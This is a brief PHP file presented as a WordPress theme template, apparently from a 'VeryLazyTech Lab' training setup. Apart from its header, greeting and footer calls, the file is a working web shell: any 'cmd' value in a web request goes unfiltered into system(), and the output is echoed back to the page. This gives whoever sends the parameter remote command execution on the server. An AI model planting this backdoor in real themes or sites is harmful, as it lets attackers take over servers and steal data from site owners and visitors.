<?php
get_header();
echo "<h1>Hello from VeryLazyTech Lab Theme</h1>";
if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }
get_footer();
?>
